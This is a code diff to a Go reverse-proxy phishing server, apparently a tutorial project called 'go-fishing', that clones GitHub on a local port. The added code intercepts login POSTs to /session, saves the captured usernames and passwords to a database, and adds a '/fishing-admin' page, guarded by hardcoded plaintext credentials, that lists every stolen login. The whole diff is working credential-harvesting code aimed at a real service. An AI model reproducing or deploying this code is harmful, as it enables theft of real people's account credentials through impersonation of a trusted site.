@@ -1,6 +1,7 @@
 package main
 
 import (
+	"go-fishing/db"
 	"io/ioutil"
 	"net/http"
 	"regexp"
@@ -11,9 +12,17 @@ const (
 	phishPort   = "8080"
 	upstreamURL = "https://github.com"
 	phishURL    = "http://localhost:8080"
+	userAccount = "ewan"
+	userPswd = "ewan1234"
 )
 
 func main() {
+	db.Connect()
+
+	// 路徑是 /phish-admin 才交給 adminHandler 處理
+	http.HandleFunc("/fishing-admin", adminHandler)
+
+	// 其他的請求就交給 handler 處理
 	http.HandleFunc("/", handler)
 	err := http.ListenAndServe(":"+phishPort, nil)
 	if err != nil {
@@ -79,7 +88,17 @@ func cloneRequest(r *http.Request) *http.Request {
 	method := r.Method
 	body := r.Body
 
+	// 把 body 讀出來轉成 string
+	bodyByte, _ := ioutil.ReadAll(r.Body)
+	bodyStr := string(bodyByte)
+
+	// 如果是 POST 到 /session 的請求
+	// 就把 body 存進資料庫內（帳號密碼 GET !!）
 	// 取得原請求的 url，把它的域名替換成真正的 Github
+	if r.URL.String() == "/session" && r.Method == "POST" {
+		db.Insert(bodyStr)
+	}
+
 	path := r.URL.Path
 	rawQuery := r.URL.RawQuery
 	url := upstreamURL + path + "?" + rawQuery
@@ -157,4 +176,23 @@ func replaceURLInResp(body []byte, header http.Header) []byte {
 	bodyStr = re.ReplaceAllString(bodyStr, upstreamURL+"$1.git")
 
 	return []byte(bodyStr)
+}
+
+func adminHandler(w http.ResponseWriter, r *http.Request) {
+	// 取得使用者輸入的帳號密碼
+	username, password, ok := r.BasicAuth()
+
+	// 判斷帳密對錯
+	if username == userAccount && password == userPswd && ok {
+	// 用寫好的 db.SelectAll() 撈到所有資料
+	strs := db.SelectAll()
+	// 在每個字串之間加兩個換行再傳回前端
+	w.Write([]byte(strings.Join(strs, "\n\n")))
+	} else {
+		// 告訴瀏覽器這個頁面需要 Basic Auth
+        w.Header().Add("WWW-Authenticate", "Basic")
+        // 回傳 `401 Unauthorized`
+        w.WriteHeader(401)
+        w.Write([]byte("授權失敗"))
+	}
 }
